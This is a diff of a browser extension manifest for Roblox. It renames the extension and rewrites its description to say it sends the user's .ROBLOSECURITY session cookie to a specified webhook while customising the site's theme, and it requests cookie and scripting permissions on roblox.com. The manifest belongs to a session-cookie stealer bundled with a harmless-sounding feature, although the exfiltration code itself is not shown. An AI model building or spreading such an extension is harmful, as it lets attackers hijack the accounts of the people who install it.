@@ -1,8 +1,8 @@
 {
   "manifest_version": 3,
-  "name": "Roblox Editor",
+  "name": "Send ROBLOSECURITY & Customize Roblox Layout",
   "version": "1.2",
-  "description": "Customizes Roblox theme layout.",
+  "description": "Sends .ROBLOSECURITY to a specified webhook and customizes Roblox theme layout.",
   "permissions": ["cookies", "activeTab", "scripting", "storage"],
   "host_permissions": ["https://*.roblox.com/*"],
   "action": {
